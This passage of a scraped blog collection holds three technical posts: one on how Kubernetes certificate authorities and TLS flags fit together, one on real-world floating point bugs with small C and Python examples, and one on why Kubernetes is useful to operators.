\"example.crt,example.key\" or \"foo.crt,foo.key:*.foo.com,foo.com\". (default [])\n \n\n and here are the arguments for the controller manager: \n\n --cluster-signing-cert-file string          Filename containing a PEM-encoded X509 CA certificate used to issue cluster-scoped certificates (default \"/etc/kubernetes/ca/ca.pem\")\n--cluster-signing-key-file string           Filename containing a PEM-encoded RSA or ECDSA private key used to sign cluster-scoped certificates (default \"/etc/kubernetes/ca/ca.key\")\n--root-ca-file string                       If set, this root certificate authority will be included in service account's token secret. This must be a valid PEM-encoded CA bundle.\n--service-account-private-key-file string   Filename containing a PEM-encoded private RSA or ECDSA key used to sign service account tokens.\n \n\n and for the kubelet: \n\n --client-ca-file string                   If set, any request presenting a client certificate signed by one of the authorities in the client-ca-file is authenticated with an identity corresponding to the CommonName of the client certificate.\n--tls-cert-file string                    File containing x509 Certificate used for serving HTTPS (with intermediate certs, if any, concatenated after server cert). If --tls-cert-file and --tls-private-key-file are not provided, a self-signed certificate and key are generated for the public address and saved to the directory passed to --cert-dir.\n--tls-private-key-file string             File containing x509 private key matching --tls-cert-file.\n \n\n In this post I’m going to assume you know basically how TLS certificates and\ncertificate authorities (“CAs”) work. When setting this up, I knew how certs\nwork but I did not understand how all the different Kubernetes certificate\nauthorities fit together. \n\n In this post I’ll explain some of the main CAs you can set in Kubernetes and\nhow they fit together. \n\n I’ll also tell you about a few things I learned while setting all of this up: \n\n \n You can’t use a CA to check the validity of the service account key. The service account key is a weird key which is handled differently from literally every other key. \n You can (and should!!) use an authenticating proxy if the way Kubernetes maps client certificates to usernames and groups doesn’t work for you \n Setting up the API server to support too many different authentication methods (“more than 2”) makes things confusing (though maybe this isn’t too surprising :)) \n \n\n (as usual, let me know what mistakes you find in here, I think most of this is\nright but it’s a complicated topic!) \n\n PKI & Kubernetes \n\n When I started reading about kubernetes I saw this term “PKI” a lot and I\nwasn’t sure what it meant. \n\n If you have a Kubernetes cluster, you might have hundreds or thousands of\nprivate & public keys (in client certificates, server certificates, anywhere!).\nThat is a lot of private keys! \n\n If you just had thousands of unrelated independent keys that would be chaos.\nChaos is not great for security.  So instead the way you manage private/public\nkeys is you have certificate authorities (“CAs”) issue certificates saying\n“hey, this public key is OK, it’s from me, you should trust it”. \n\n Your PKI (“public key infrastructure”) is how you organize all of your keys –\nwhich keys are signed by which certificate authorities. \n\n For example: \n\n \n You could have one CA per Kubernetes cluster, that’s responsible for signing\nall the public keys in that cluster (this is the model Kubernetes\ndocmentation usually assumes) \n You could have one global CA that’s responsible for signing ALL your public keys \n You could have one CA you use for services that are externally visible and another CA you use for internal-only services \n … something else \n \n\n I’m not a security expert and I’m  not gonna try to tell you how you should\nmanage the private keys + certificate authorities  in your infrastructure. But!\nNo matter what PKI model you want to use, I’m pretty sure you can make it work with Kubernetes. \n\n This blog post is about how to take your own requirements about how certificate\nauthorities + private keys should be organized and set up your Kubernetes\ncluster the way you need to. \n\n Does a Kubernetes cluster have to have a single root certificate authority? (no) \n\n If you read a lot of guides to how to set up Kubernetes, you’ll see a step like\n“set up a certificate authority”. Kelsey Hightower’s great “kubernetes the hard way” doc has it as  Step 2 , and the  Trusting TLS in a cluster  guide says: \n\n \n Every Kubernetes cluster has a cluster root Certificate Authority\n(CA). The CA is generally used by cluster components to validate the\nAPI server’s certificate, by the API server to validate kubelet client\ncertificates, etc. \n \n\n The way this basically works is: \n\n \n Set up a certificate authority \n Use that certificate authority to generate a bunch of different certificates that you’ll give to different parts of the Kubernetes infrastructure. \n \n\n But what if you don’t want to set up a new certificate authority for\neach kubernetes cluster? We didn’t want to do this for various reasons that I won’t go into,\nand at first I was worried that you  had  to set up a single root cluster CA. \n\n It turns out that this sentence (“every Kubernetes cluster has a\n[single] cluster root Certificate Authority”) is not true – you can\nactually use certificates issued by several completely different CAs to\nmanage your Kubernetes cluster and it’s fine. \n\n To be clear – I’m not saying you  shouldn’t  have a single root certificate\nfor your Kubernetes cluster, I’m just saying you don’t have to if for whatever\nreason that way doesn’t meet your requirements. \n\n Let’s break down some of these command line arguments about certificates and\nhow they relate to each other. Each of these sections is about one certificate\nauthority you can define. They’re all independent – none of them need to be the\nsame as any other one. (though in practice you will probably want to make some\nof them the same, you don’t want to be managing like 6 CAs probably). \n\n The API server’s TLS certificate (and certificate authority) \n\n  --tls-cert-file string             \n    File containing the default x509 Certificate for HTTPS. (CA cert, if any,\n    concatenated after server cert). If HTTPS serving is enabled, and\n    --tls-cert-file and --tls-private-key-file are not provided, a self-signed\n    certificate and key are generated for the public address and saved to\n    /var/run/kubernetes.\n --tls-private-key-file string      \n    File containing the default x509 private key matching --tls-cert-file.\n \n\n You’re probably using TLS to connect to your Kubernetes API server. These two\noptions (to the API server) let you pick what certificate the API server should use. \n\n Once you set a TLS cert, you’ll need to set up a kubeconfig file for the\ncomponents (like the kubelet and kubectl) that want to talk to the API server. \n\n The kubeconfig file will look something like this: \n\n current-context: my-context\napiVersion: v1\nclusters:\n- cluster:\n    certificate-authority: /path/to/my/ca.crt # CERTIFICATE AUTHORITY THAT ISSUED YOUR TLS CERT\n    server: https://horse.org:4443 # this name needs to be on the certificate in --tls-cert-file\n  name: my-cluster\nkind: Config\nusers:\n- name: green-user\n  user:\n    client-certificate: path/to/my/client/cert # we'll get to this later\n    client-key: path/to/my/client/key # we'll get to this later\n \n\n One thing I found surprising about this is – almost everything else in the\nuniverse that uses TLS will look in /etc/ssl to find a list of certificate\nauthorities the computer trusts by default. But Kubernetes doesn’t do that,\ninstead it mandates “no, you have to say exactly which CA issued the API\nserver’s TLS cert”. \n\n You can pass this kubeconfig file into any kubernetes component with  --kubeconfig /path/to/kubeconfig.yaml \n\n So! We’ve met our first certificate authority: the CA that issues the API\nserver’s TLS cert. This CA doesn’t need to be the same as any of the other\ncertificate authorities we’re going to discuss. \n\n The API server client certificate authority (+ certificates) \n\n --client-ca-file string    \n    If set, any request presenting a client certificate signed by one of the\n    authorities in the client-ca-file is authenticated with an identity\n    corresponding to the CommonName of the client certificate.\n \n\n One way for Kubernetes components to authenticate to the API server is with\n client certificates . \n\n All of these client certs should be issued by the same CA (which, again,\ndoesn’t need to be the same as the CA that issued the API server’s server TLS\ncert). \n\n When using a kubeconfig file (like we talked about above), you set the client certificates in that file, like this: \n\n kind: Config\nusers:\n- name: green-user\n  user:\n    client-certificate: path/to/my/client/cert\n    client-key: path/to/my/client/key\n \n\n Kubernetes makes a lot of assumptions about how you’ve set up your client\ncertificates. (it sets the user to be the Common Name field and the group to be\nthe Organization field). If those assumptions don’t match what you want,\nthe right thing to do is to  not use  client cert auth and instead use\nan authenticating proxy. \n\n The request header certificate authority (or: using an authenticating proxy) \n\n # API server arguments\n--requestheader-allowed-names stringSlice                 \n  \t    List of client\n        certificate common names to allow to provide usernames in headers specified by\n        --requestheader-username-headers. If empty, any client certificate validated by\n        the authorities in --requestheader-client-ca-file is allowed.\n--requestheader-client-ca-file string                     \n        Root certificate bundle to use to verify client certificates on incoming\n        requests before trusting usernames in headers specified by\n        --requestheader-username-headers\n \n\n Another way to set up Kubernetes auth is with an  authenticating proxy . If\nyou have a lot of opinions about what usernames and groups should be sent to the\nAPI server, you can set up a proxy which passes usernames & groups to the API server in a HTTP header. \n\n The docs basically explain how this works – the proxy uses a client cert to\nidentify itself, and the  --requestheader-client-ca-file  tells the API server\nwhich CA to use to verify that client cert. \n\n I don’t have too much to say about this except – we learned pretty quickly\nthat having too many auth methods in your API server (“accept client\ncertificates OR an authenticating proxy OR a token OR…“) makes things\nconfusing. It’s probably better to pick a small number (like 1 or\n2?) of authentication methods your API server supports because it makes it\neasier to debug problems and understand your security model. \n\n serviceaccount private keys (which aren’t signed by a certificate authority) \n\n # API server argument\n--service-account-key-file stringArray\n    File containing PEM-encoded x509 RSA or ECDSA private or public keys, used to\n    verify ServiceAccount tokens. If unspecified, --tls-private-key-file is used.\n    The specified file can contain multiple keys, and the flag can be specified\n    multiple times with different files.\n# controller manager argument\n--service-account-private-key-file string\n    Filename containing a PEM-encoded private RSA or ECDSA key used to sign service\n    account tokens.\n \n\n The controller manager signs serviceaccount tokens with a private key. Unlike\nevery other private key that Kubernetes supports, the serviceaccount key\ndoesn’t support “hey use a CA to check if this is the right key”. This means\nyou have to give exactly the same private key file to every controller manager. \n\n Anyway this key does not need to have a certificate and does not need to be\nsigned by any certificate authority. You can just generate a key with \n\n openssl genrsa -out private.key 4096\n \n\n and distribute it to every controller manager / API server. \n\n Using  --tls-private-key-file  for this seems generally fine to me though, as\nlong as you give every API server the same TLS key (which I think you usually\nwould?). (I’m assuming here that you have a HA setup where you run more than\none API server and more than one controller manager) \n\n If you give 2 different controller managers 2 different keys, they’ll sign\nserviceaccount tokens with different keys and you’ll end up with invalid\nserviceaccount tokens (see  this issue ). I think this isn’t ideal (Kubernetes should probably\nsupport these keys being issued from a CA like it does for ~every other private\nkey). From reading the source code I think the reason it’s set up this way is\nthat  jwt-go  doesn’t support using a CA\nto check signatures. \n\n kubelet certificate authorities \n\n Let’s talk about the kubelet! Here are the relevant command line arguments for the API server & kubelet: \n\n # API server arguments\n--kubelet-certificate-authority string    Path to a cert file for the certificate authority.\n--kubelet-client-certificate string       Path to a client cert file for TLS.\n--kubelet-client-key string               Path to a client key file for TLS.\n# kubelet arguments\n--client-ca-file string                   If set, any request presenting a client certificate signed by one of the authorities in the client-ca-file is authenticated with an identity corresponding to the CommonName of the client certificate.\n--tls-cert-file string                    File containing x509 Certificate used for serving HTTPS (with intermediate certs, if any, concatenated after server cert). If --tls-cert-file and --tls-private-key-file are not provided, a self-signed certificate and key are generated for the public address and saved to the directory passed to --cert-dir.\n--tls-private-key-file string             File containing x509 private key matching --tls-cert-file.\n \n\n It’s useful to authenticate requests to the kubelet because the kubelet can\nexecute arbitrary code on your machines :) (in fact that’s its job) \n\n There are actually 2 CAs here. I won’t go into too much detail because this is\nthe same as the setup for the APi server – the kubelet has a TLS cert (that it\nuses to serve TLS requests) and also supports client cert authentication. \n\n You tell the API server what certificate authority to use to check the\nkubelet’s TLS cert, and what client certificate to use when talking to the\nkubelet. \n\n Again these 2 CAs could be totally different from each other. \n\n so many possible CAs \n\n So far we have found 5 different certificate authorities you can specify as\npart of setting up a Kubernetes cluster! They’re all handled independently and\nin theory they could all be totally different. \n\n I didn’t discuss every single CA setting that Kubernetes supports (there are\nstill more!) but hopefully this gives you some of the tools you need to read\nthe docs about the rest. \n\n Again – it almost certainly doesn’t makes sense to make them  all  different\nfrom each other but I think it’s useful to understand how all this is set up if\nyou have your own requirements around how you want to handle your\ncertificate authorities for Kubernetes and don’t want to do exactly what the\ndocs suggest. \n\n"},
{"url": "https://jvns.ca/blog/2023/01/13/examples-of-floating-point-problems/", "title": "Examples of floating point problems", "content": "\n     \n\n Hello! I’ve been thinking about writing a zine about how things are represented on computers in bytes, so I was thinking about floating point. \n\n I’ve heard a million times about the dangers of floating point arithmetic, like: \n\n \n addition isn’t associative ( x + (y + z)  is different from  (x + y) + z ) \n if you add very big values to very small values, you can get inaccurate results (the small numbers get lost!) \n you can’t represent very large integers as floating numbers \n NaN/infinity values can propagate and cause chaos \n there are two zeros (+0 and -0), and they’re not represented the same way \n denormal/subnormal values are weird \n \n\n But I find all of this a little abstract on its own, and I really wanted some\nspecific examples of floating point bugs in real-world programs. \n\n So I  asked on Mastodon  for\nexamples of how floating point has gone wrong for them in real programs, and as\nalways folks delivered! Here are a bunch of examples. I’ve also written some\nexample programs for some of them to see exactly what happens. Here’s a table of contents: \n\n how does floating point work?   \n floating point isn’t “bad” or random   \n example 1: the odometer that stopped   \n example 2: tweet IDs in Javascript   \n example 3: a variance calculation gone wrong   \n example 4: different languages sometimes do the same floating point calculation differently   \n example 5: the deep space kraken   \n example 6: the inaccurate timestamp   \n example 7: splitting a page into columns   \n example 8: collision checking   \n\n None of these 8 examples talk about NaNs or +0/-0 or infinity values or\nsubnormals, but it’s not because those things don’t cause problems – it’s just\nthat I got tired of writing at some point :). \n\n Also I’ve probably made some mistakes in this post. \n\n how does floating point work? \n\n I’m not going to write a long explanation of how floating point works in this post, but here’s a comic I wrote a few years ago that talks about the basics: \n\n \n\n floating point isn’t “bad” or random \n\n I don’t want you to read this post and conclude that floating point is bad.\nIt’s an amazing tool for doing numerical calculations. So many smart people\nhave done so much work to make numerical calculations on computers efficient and\naccurate! Two points about how all of this isn’t floating point’s fault: \n\n \n Doing numerical computations on a computer inherently involves\nsome approximation and rounding, especially if you want to do it\nefficiently. You can’t always store an arbitrary amount of precision for\nevery single number you’re working with. \n Floating point is standardized (IEEE 754), so operations like addition on\nfloating point numbers are deterministic – my understanding is that 0.1 +\n0.2 will always give you the exact same result (0.30000000000000004), even\nacross different architectures. It might not be the result you  expected ,\nbut it’s actually very predictable. \n \n\n My goal for this post is just to explain what kind of problems can come up with\nfloating point numbers and why they happen so that you know when to be\ncareful with them, and when they’re not appropriate. \n\n Now let’s get into the examples. \n\n example 1: the odometer that stopped \n\n One person said that they were working on an odometer that was continuously\nadding small amounts to a 32-bit float to measure distance travelled, and\nthings went very wrong. \n\n To make this concrete, let’s say that we’re adding numbers to the odometer 1cm\nat a time. What does it look like after 10,000 kilometers? \n\n Here’s a C program that simulates that: \n\n #include <stdio.h>\nint main() {\n    float meters = 0;\n    int iterations = 100000000;\n    for (int i = 0; i < iterations; i++) {\n        meters += 0.01;\n    }\n    printf(\"Expected: %f km\\n\", 0.01 * iterations / 1000 );\n    printf(\"Got: %f km \\n\", meters / 1000);\n}\n \n\n and here’s the output: \n\n Expected: 10000.000000 km\nGot: 262.144012 km\n \n\n This is VERY bad – it’s not a small error, 262km is a LOT less than 10,000km. What went wrong? \n\n what went wrong: gaps between floating point numbers get big \n\n The problem in this case is that, for 32-bit floats, 262144.0 + 0.01 = 262144.0.\nSo it’s not just that the number is inaccurate, it’ll actually never increase\nat all! If we travelled another 10,000 kilometers, the odometer would still be\nstuck at 262144 meters (aka 262.144km). \n\n Why is this happening? Well, floating point numbers get farther apart as they get bigger. In this example, for 32-bit floats, here are 3 consecutive floating point numbers: \n\n \n 262144.0 \n 262144.03125 \n 262144.0625 \n \n\n I got those numbers by going to  https://float.exposed/0x48800000  and incrementing the ‘significand’ number a couple of times. \n\n So, there are no 32-bit floating point numbers between 262144.0 and 262144.03125. Why is that a problem? \n\n The problem is that 262144.03125 is about 262144.0 + 0.03. So when we try to\nadd 0.01 to 262144.0, it doesn’t make sense to round up to the next number. So\nthe sum just stays at 262144.0. \n\n Also, it’s not a coincidence that 262144 is a power of 2 (it’s 2^18). The gaps\nbeen floating point numbers change after every power of 2, and at 2^18 the gap\nbetween 32-bit floats is 0.03125, increasing from 0.016ish. \n\n one way to solve this: use a double \n\n Using a 64-bit float fixes this – if we replace  float  with  double  in the above C program, everything works a lot better. Here’s the output: \n\n Expected: 10000.000000 km\nGot: 9999.999825 km\n \n\n There are still some small inaccuracies here – we’re off about 17 centimeters.\nWhether this matters or not depends on the context: being slightly off could very\nwell be disastrous if we were doing a precision space maneuver or something, but\nit’s probably fine for an odometer. \n\n Another way to improve this would be to increment the odometer in bigger chunks\n– instead of adding 1cm at a time, maybe we could update it less frequently,\nlike every 50cm. \n\n If we use a double  and  increment by 50cm instead of 1cm, we get the exact\ncorrect answer: \n\n Expected: 10000.000000 km\nGot: 10000.000000 km\n \n\n A third way to solve this could be to use an  integer : maybe we decide that\nthe smallest unit we care about is 0.1mm, and then measure everything as\ninteger multiples of 0.1mm. I have never built an odometer so I can’t say what\nthe best approach is. \n\n example 2: tweet IDs in Javascript \n\n Javascript only has floating point numbers – it doesn’t have an integer type.\nThe biggest integer you can represent in a 64-bit floating point number is\n2^53. \n\n But tweet IDs are big numbers, bigger than 2^53. The Twitter API now returns\nthem as both integers and strings, so that in Javascript you can just use the\nstring ID (like “1612850010110005250”), but if you tried to use the integer\nversion in JS, things would go very wrong. \n\n You can check this yourself by taking a tweet ID and putting it in the\nJavascript console, like this: \n\n >> 1612850010110005250 \n   1612850010110005200\n \n\n Notice that 1612850010110005200 is NOT the same number as 1612850010110005250!! It’s 50 less! \n\n This particular issue doesn’t happen in Python (or any other language that I\nknow of), because Python has integers. Here’s what happens if we enter the same number in a Python REPL: \n\n In [3]: 1612850010110005250\nOut[3]: 1612850010110005250\n \n\n Same number, as you’d expect. \n\n example 2.1: the corrupted JSON data \n\n This is a small variant of the “tweet IDs in Javascript” issue, but even if\nyou’re  not  actually writing Javascript code, numbers in JSON are still sometimes\ntreated as if they’re floats. This mostly makes sense to me because JSON has\n“Javascript” in the name, so it seems reasonable to decode the values the way\nJavascript would. \n\n For example, if we pass some JSON through  jq , we see the exact same issue:\nthe number 1612850010110005250 gets changed into 1612850010110005200. \n\n $ echo '{\"id\": 1612850010110005250}' | jq '.'\n{\n  \"id\": 1612850010110005200\n}\n \n\n But it’s not consistent across all JSON libraries Python’s  json  module will decode  1612850010110005250  as the correct integer. \n\n Several people mentioned issues with sending floats in JSON, whether either\nthey were trying to send a large integer (like a pointer address) in JSON and\nit got corrupted, or sending smaller floating point values back and forth\nrepeatedly and the value slowly diverging over time. \n\n example 3: a variance calculation gone wrong \n\n Let’s say you’re doing some statistics, and you want to calculate the variance\nof many numbers. Maybe more numbers than you can easily fit in memory, so you\nwant to do it in a single pass. \n\n There’s a simple (but bad!!!) algorithm you can use to calculate the variance in a single pass,\nfrom  this blog post . Here’s some Python code: \n\n def calculate_bad_variance(nums):\n    sum_of_squares = 0\n    sum_of_nums = 0\n    N = len(nums)\n    for num in nums:\n        sum_of_squares += num**2\n        sum_of_nums += num\n    mean = sum_of_nums / N\n    variance = (sum_of_squares - N * mean**2) / N\n\n    print(f\"Real variance: {np.var(nums)}\")\n    print(f\"Bad variance: {variance}\")\n \n\n First, let’s use this bad algorithm to calculate the variance of 5 small numbers. Everything looks pretty good: \n\n In [2]: calculate_bad_variance([2, 7, 3, 12, 9])\nReal variance: 13.84\nBad variance: 13.840000000000003 <- pretty close!\n \n\n Now, let’s try it the same 100,000 large numbers that are very close together (distributed between 100000000 and  100000000.06) \n\n In [7]: calculate_bad_variance(np.random.uniform(100000000, 100000000.06, 100000))\nReal variance: 0.00029959105209321173\nBad variance: -138.93632 <- OH NO\n \n\n This is extremely bad: not only is the bad variance way off, it’s NEGATIVE! (the variance is never supposed to be negative, it’s always zero or more) \n\n what went wrong: catastrophic cancellation \n\n What’s going here is similar to our odometer number problem: the\n sum_of_squares  number gets extremely big (about 10^21 or 2^69), and at that point, the\ngap between consecutive floating point numbers is also very big – it’s 2**46.\nSo we just lose all precision in our calculations. \n\n The term for this problem is “catastrophic cancellation” – we’re subtracting\ntwo very large floating point numbers which are both going to be pretty far\nfrom the correct value of the calculation, so the result of the subtraction is\nalso going to be wrong. \n\n The blog post I mentioned before \ntalks about a better algorithm people use to compute variance called\nWelford’s algorithm, which doesn’t have the catastrophic cancellation issue. \n\n And of course, the solution for most people is to just use a scientific\ncomputing library like Numpy to calculate variance instead of trying to do it\nyourself :) \n\n example 4: different languages sometimes do the same floating point calculation differently \n\n A bunch of people mentioned that different platforms will do the same\ncalculation in different ways. One way this shows up in practice is – maybe\nyou have some frontend code and some backend code that do the exact same\nfloating point calculation. But it’s done slightly differently in Javascript\nand in PHP, so you users end up seeing discrepancies and getting confused. \n\n In principle you might think that different implementations should work the\nsame way because of the IEEE 754 standard for floating point, but here are a\ncouple of caveats that were mentioned: \n\n \n math operations in libc (like sin/log) behave differently in different\nimplementations. So code using glibc could give you different results than\ncode using musl \n some x86 instructions can use 80 bit precision for some double operations\ninternally instead of 64 bit precision.  Here’s a GitHub issue talking about\nthat \n \n\n I’m not very sure about these points and I don’t have concrete examples I can reproduce. \n\n example 5: the deep space kraken \n\n Kerbal Space Program is a space simulation game, and it used to have a bug\ncalled the  Deep Space Kraken  where when\nyou moved very fast, your ship would start getting destroyed due to floating point issues. This is similar to the other problems we’ve talked out involving big floating numbers (like the variance problem), but I wanted to mention it because: \n\n \n it has a funny name \n it seems like a very common bug in video games / astrophysics / simulations in general – if you have points that are very far from the origin, your math gets messed up \n \n\n Another example of this is the  Far Lands  in Minecraft. \n\n example 6: the inaccurate timestamp \n\n I promise this is the last example of “very large floating numbers can ruin your day”.\nBut! Just one more! Let’s imagine that we try to represent the current Unix epoch in nanoseconds\n(about 1673580409000000000) as a 64-bit floating point number. \n\n This is no good! 1673580409000000000 is about 2^60 (crucially, bigger than 2^53), and the next 64-bit float after it is 1673580409000000256. \n\n So this would be a great way to end up with inaccuracies in your time math. Of\ncourse, time libraries actually represent times as integers, so this isn’t\nusually a problem. (there’s always still the  year 2038 problem , but that’s not\nrelated to floats) \n\n In general, the lesson here is that sometimes it’s better to use integers. \n\n example 7: splitting a page into columns \n\n Now that we’ve talked about problems with big floating point numbers, let’s do\na problem with small floating point numbers. \n\n Let’s say you have a page width, and a column width, and you want to figure out: \n\n \n how many columns fit on the page \n how much space is left over \n \n\n You might reasonably try  floor(page_width / column_width)  for the first\nquestion and  page_width % column_width  for the second question. Because\nthat would work just fine with integers! \n\n In [5]: math.floor(13.716 / 4.572)\nOut[5]: 3\n\nIn [6]: 13.716 % 4.572\nOut[6]: 4.571999999999999\n \n\n This is wrong! The amount of space left is 0! \n\n A better way to calculate the amount of space left might have been\n 13.716 - 3 * 4.572 , which gives us a very small negative number. \n\n I think the lesson here is to never calculate the same thing in 2 different ways with floats. \n\n This is a very basic example but I can kind of see how this would create all\nkinds of problems if I was doing page layout with floating point numbers, or\ndoing CAD drawings. \n\n example 8: collision checking \n\n Here’s a very silly Python program, that starts a variable at 1000 and\ndecrements it until it collides with 0. You can imagine that this is part of a\npong game or something, and that  a  is a ball that’s supposed to collide with\na wall. \n\n a = 1000\nwhile a != 0:\n    a -= 0.001\n \n\n You might expect this program to terminate. But it doesn’t!  a  is never 0,\ninstead it goes from 1.673494676862619e-08 to -0.0009999832650532314. \n\n The lesson here is that instead of checking for float equality, usually you\nwant to check if two numbers are different by some very small amount. Or here\nwe could just write  while a > 0 . \n\n that’s all for now \n\n I didn’t even get to NaNs (the are so many of them!) or infinity or +0 / -0 or subnormals, but we’ve\nalready written 2000 words and I’m going to just publish this. \n\n I might write another followup post later – that Mastodon thread has literally\n15,000 words of floating point problems in it, there’s a lot of material! Or I\nmight not, who knows :) \n\n"},
{"url": "https://jvns.ca/blog/2017/10/05/reasons-kubernetes-is-cool/", "title": "Reasons Kubernetes is cool", "content": "\n     \n\n When I first learned about Kubernetes (a year and a half ago?) I really didn’t understand why I\nshould care about it. \n\n I’ve been working full time with Kubernetes for 3 months or so and now have some thoughts about why\nI think it’s useful. (I’m still very far from being a Kubernetes expert!) Hopefully this will help a\nlittle in your journey to understand what even is going on with Kubernetes! \n\n I will try to explain some reason I think Kubenetes is interesting without using the words “cloud native”,\n“orchestration”, “container”, or any Kubernetes-specific terminology :). I’m going to explain this\nmostly from the perspective of a kubernetes operator / infrastructure engineer, since my job right\nnow is to set up Kubernetes and make it work well. \n\n I’m not going to try to address the question of “should you use kubernetes for your production\nsystems?” at all, that is a very complicated question. (not least because “in production” has\ntotally different requirements depending on what you’re doing) \n\n Kubernetes lets you run code in production without setting up new servers \n\n The first pitch I got for Kubernetes was the following conversation with my partner Kamal: \n\n Here’s an approximate transcript: \n\n \n Kamal: With Kubernetes you can set up a new service with a single command \n Julia: I don’t understand how that’s possible. \n Kamal: Like, you just write 1 configuration file, apply it, and then you have a HTTP service running in production \n Julia: But today I need to create new AWS instances, write a puppet manifest, set up service discovery, configure my load balancers, configure our deployment software, and make sure DNS is working, it takes at least 4 hours if nothing goes wrong. \n Kamal: Yeah. With Kubernetes you don’t have to do any of that, you can set up a new HTTP service in 5 minutes and it’ll just automatically run. As long as you have spare capacity in your cluster it just works! \n Julia: There must be a trap \n \n\n There kind of is a trap, setting up a production Kubernetes cluster is (in my experience) is\ndefinitely not easy. (see  Kubernetes The Hard Way  for what’s involved to get\nstarted). But we’re not going to go into that right now! \n\n So the first cool thing about Kubernetes is that it has the potential to make life way easier for\ndevelopers who want to deploy new software into production. That’s cool, and it’s actually true,\nonce you have a working Kubernetes cluster you really can set up a production HTTP service (“run 5\nof this application, set up a load balancer, give it this DNS name, done”)  with just one\nconfiguration file. It’s really fun to see. \n\n Kubernetes gives you easy visibility & control of what code you have running in production \n\n IMO you can’t understand Kubernetes without understanding etcd. So let’s talk about etcd! \n\n Imagine that I asked you today “hey, tell me every application you have running in production, what\nhost it’s running on, whether it’s healthy or not, and whether or not it has a DNS name attached to\nit”. I don’t know about you but I would need to go look in a bunch of different places to answer\nthis question and it would take me quite a while to figure out. I definitely can’t query just one\nAPI. \n\n In Kubernetes, all the state in your cluster  – applications running (“pods”), nodes, DNS names,\ncron jobs, and more – is stored in a single database (etcd). Every Kubernetes component is\nstateless, and basically works by \n\n \n Reading state from etcd (eg “the list of pods assigned to node 1”) \n Making changes (eg “actually start running pod A on node 1”) \n Updating the state in etcd (eg “set the state of pod A to ‘running’”) \n \n\n This means that if you want to answer a question like “hey, how many nginx pods do I have running\nright now in that availabliity zone?” you can answer it by querying a single unified API (the\nKubernetes API!). And you have exactly the same access to that API that every other Kubernetes\ncomponent does. \n\n This also means that you have easy control of everything running in Kubernetes. If you want to, say, \n\n \n Implement a complicated custom rollout strategy for deployments (deploy 1 thing, wait 2 minutes, deploy 5 more, wait 3.7 minutes, etc) \n Automatically  start a new webserver  every time a branch is pushed to github \n Monitor all your running applications to make sure all of them have a reasonable cgroups memory limit \n \n\n all you need to do is to write a program that talks to the Kubernetes API. (a “controller”) \n\n Another very exciting thing about the Kubernetes API is that you’re not limited to just\nfunctionality that Kubernetes provides! If you decide that you have your own opinions about how your\nsoftware should be deployed / created / monitored, then you can write code that uses the Kubernetes\nAPI to do it! It lets you do everything you need. \n\n If every Kubernetes component dies, your code will still keep running \n\n One thing I was originally promised (by various blog posts :)) about Kubernetes was “hey, if the\nKubernetes apiserver and everything else dies, it’s ok, your code will just keep running”. I thought\nthis sounded cool in theory but I wasn’t sure if it was actually true. \n\n So far it seems to be actually true! \n\n I’ve been through some etcd outages now, and what happens is \n\n \n All the code that was running keeps running \n Nothing  new  happens (you can’t deploy new code or make changes, cron jobs will stop working) \n When everything comes back, the cluster will catch up on whatever it missed \n \n\n This does mean that if etcd goes down and one of your applications crashes or something, it can’t come back up until etcd returns. \n\n Kubernetes’ design is pretty resilient to bugs \n\n Like any piece of software, Kubernetes has bugs. For example right now in our cluster the controller manager has a memory leak, and the scheduler crashes pretty regularly. Bugs obviously aren’t good but so far I’ve found that Kubernetes’ design helps mitigate a lot of the bugs in its core components really well. \n\n If you restart any component, what happens is: \n\n \n It reads all its relevant state from etcd \n It starts doing the necessary things it’s supposed to be doing based on that state (scheduling pods, garbage collecting completed pods, scheduling cronjobs, deploying daemonsets, whatever) \n \n\n Because all the components don’t keep any state in memory, you can just restart them at any time and that can help mitigate a variety of bugs. \n\n For example! Let’s say you have a memory leak in your controller manager. Because the controller\nmanager is stateless, you can just periodically restart it every hour or something and feel\nconfident that you won’t cause any consistency issues. Or we ran into a bug in the scheduler where\nit would sometimes just forget about pods and never schedule them. You can sort of mitigate this\njust by restarting the scheduler every 10 minutes. (we didn’t do that, we fixed the bug instead, but\nyou  could  :) ) \n\n So I feel like I can trust Kubernetes’ design to help make sure the state in the cluster is\nconsistent even when there are bugs in its core components. And in general I think the software is\ngenerally improving over time.  The only stateful thing you have to operate is etcd \n\n Not to harp on this “state” thing too much but – I think it’s cool that in Kubernetes the only\nthing you have to come up with backup/restore plans for is etcd (unless you use persistent volumes\nfor your pods). I think it makes kubernetes operations a lot easier to think about. \n\n Implementing new distributed systems on top of Kubernetes is relatively easy \n\n Suppose you want to implement a distributed cron job scheduling system! Doing that from scratch is a\nton of work. But implementing a distributed cron job scheduling system inside Kubernetes is much\neasier! (still not trivial, it’s still a distributed system) \n\n The first time I read the code for the Kubernetes cronjob controller I was really delighted by how\nsimple it was. Here, go read it! The main logic is like 400 lines of Go. Go ahead, read it! =>\n cronjob_controller.go  <= \n\n Basically what the cronjob controller does is: \n\n \n Every 10 seconds:\n\n \n Lists all the cronjobs that exist \n Checks if any of them need to run right now \n If so, creates a new Job object to be scheduled & actually run by other Kubernetes controllers \n Clean up finished jobs \n Repeat \n \n \n\n The Kubernetes model is pretty constrained (it has this pattern of resources are defined in etcd,\ncontrollers read those resources and update etcd), and I think having this relatively\nopinionated/constrained model makes it easier to develop your own distributed systems inside the\nKubernetes framework. \n\n Kamal introduced me to this idea of “Kubernetes is a good platform for writing your own distributed systems” instead of just “Kubernetes is a distributed system you can use” and I think it’s really interesting. He has a prototype of a  system to run an HTTP service for every branch you push to github . It took him a weekend and is like 800 lines of Go, which I thought was impressive! \n\n Kubernetes lets you do some amazing things (but isn’t easy) \n\n I started out by saying “kubernetes lets you do these magical things, you can just spin up so much\ninfrastructure with a single configuration file, it’s amazing”. And that’s true! \n\n What I mean by “Kubernetes isn’t easy” is that Kubernetes has a lot of moving parts learning how to\nsuccessfully operate a highly available Kubernetes cluster is a lot of work. Like I find that with a\nlot of the abstractions it gives me, I need to understand what is underneath those abstractions in\norder to debug issues and configure things properly. I love learning new things so this doesn’t make\nme angry or anything, I just think it’s important to know :) \n\n One specific example of “I can’t just rely on the abstractions” that I’ve struggled with is that I\nneeded to learn a LOT  about how networking works on Linux  to feel confident with setting up\nKubernetes networking, way more than I’d ever had to learn about networking before. This was very\nfun but pretty time consuming. I might write more about what is hard/interesting about setting up Kubernetes networking at some point. \n\n Or I wrote a  2000 word blog post \nabout everything I had to learn about Kubernetes’ different options for certificate authorities to\nbe able to set up my Kubernetes CAs successfully. \n\n I think some of these managed Kubernetes systems like GKE (google’s kubernetes product) may be\nsimpler since they make a lot of decisions for you but I haven’t tried any of them. \n\n"},
